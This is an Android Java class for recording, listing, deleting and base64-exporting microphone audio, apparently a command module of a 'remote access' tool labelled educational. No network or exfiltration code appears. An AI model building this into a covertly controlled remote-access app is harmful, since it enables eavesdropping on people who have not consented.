package com.remoteaccess.educational.commands;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.util.Base64;
import androidx.core.app.ActivityCompat;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;

/**
 * EDUCATIONAL AUDIO RECORDER
 * 
 * ⚠️ DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY
 * - Requires RECORD_AUDIO permission
 * - User must grant permission explicitly
 * - Recordings stored locally
 * 
 * USE CASES:
 * - Voice memos
 * - Meeting recordings (with consent)
 * - Audio notes
 * - Educational demonstrations
 */
public class AudioRecorder {

    private Context context;
    private MediaRecorder mediaRecorder;
    private String currentRecordingPath;
    private boolean isRecording = false;

    public AudioRecorder(Context context) {
        this.context = context;
    }

    /**
     * Start audio recording
     */
    public JSONObject startRecording(String filename) {
        JSONObject result = new JSONObject();
        
        try {
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) 
                != PackageManager.PERMISSION_GRANTED) {
                result.put("success", false);
                result.put("error", "RECORD_AUDIO permission not granted");
                return result;
            }

            if (isRecording) {
                result.put("success", false);
                result.put("error", "Already recording");
                return result;
            }

            // Create file
            if (filename == null || filename.isEmpty()) {
                filename = "audio_" + System.currentTimeMillis() + ".3gp";
            }
            
            File audioFile = new File(context.getExternalFilesDir(null), filename);
            currentRecordingPath = audioFile.getAbsolutePath();

            // Setup MediaRecorder
            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.setOutputFile(currentRecordingPath);

            mediaRecorder.prepare();
            mediaRecorder.start();
            
            isRecording = true;

            result.put("success", true);
            result.put("message", "Recording started");
            result.put("filePath", currentRecordingPath);
            result.put("filename", filename);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Stop audio recording
     */
    public JSONObject stopRecording() {
        JSONObject result = new JSONObject();
        
        try {
            if (!isRecording) {
                result.put("success", false);
                result.put("error", "Not recording");
                return result;
            }

            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            
            isRecording = false;

            File audioFile = new File(currentRecordingPath);
            long fileSize = audioFile.length();

            result.put("success", true);
            result.put("message", "Recording stopped");
            result.put("filePath", currentRecordingPath);
            result.put("fileSize", fileSize);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get recording status
     */
    public JSONObject getStatus() {
        JSONObject result = new JSONObject();
        
        try {
            result.put("success", true);
            result.put("isRecording", isRecording);
            
            if (isRecording && currentRecordingPath != null) {
                result.put("currentFile", currentRecordingPath);
            }
            
        } catch (JSONException e) {
            e.printStackTrace();
        }
        
        return result;
    }

    /**
     * Get recorded audio as base64
     */
    public JSONObject getAudioAsBase64(String filePath) {
        JSONObject result = new JSONObject();
        
        try {
            File audioFile = new File(filePath);
            
            if (!audioFile.exists()) {
                result.put("success", false);
                result.put("error", "File not found");
                return result;
            }

            if (audioFile.length() > 5 * 1024 * 1024) { // 5MB limit
                result.put("success", false);
                result.put("error", "File too large (max 5MB)");
                return result;
            }

            // Read file
            FileInputStream fis = new FileInputStream(audioFile);
            byte[] data = new byte[(int) audioFile.length()];
            fis.read(data);
            fis.close();

            // Convert to base64
            String base64 = Base64.encodeToString(data, Base64.NO_WRAP);

            result.put("success", true);
            result.put("base64", base64);
            result.put("filePath", filePath);
            result.put("fileSize", audioFile.length());
            result.put("filename", audioFile.getName());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * List all recordings
     */
    public JSONObject listRecordings() {
        JSONObject result = new JSONObject();
        
        try {
            File directory = context.getExternalFilesDir(null);
            File[] files = directory.listFiles((dir, name) -> 
                name.startsWith("audio_") && name.endsWith(".3gp")
            );

            org.json.JSONArray recordings = new org.json.JSONArray();
            
            if (files != null) {
                for (File file : files) {
                    JSONObject recording = new JSONObject();
                    recording.put("filename", file.getName());
                    recording.put("path", file.getAbsolutePath());
                    recording.put("size", file.length());
                    recording.put("lastModified", file.lastModified());
                    recordings.put(recording);
                }
            }

            result.put("success", true);
            result.put("recordings", recordings);
            result.put("count", recordings.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Delete recording
     */
    public JSONObject deleteRecording(String filePath) {
        JSONObject result = new JSONObject();
        
        try {
            File audioFile = new File(filePath);
            
            if (!audioFile.exists()) {
                result.put("success", false);
                result.put("error", "File not found");
                return result;
            }

            boolean deleted = audioFile.delete();

            result.put("success", deleted);
            result.put("message", deleted ? "Recording deleted" : "Failed to delete");
            result.put("filePath", filePath);
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }
}
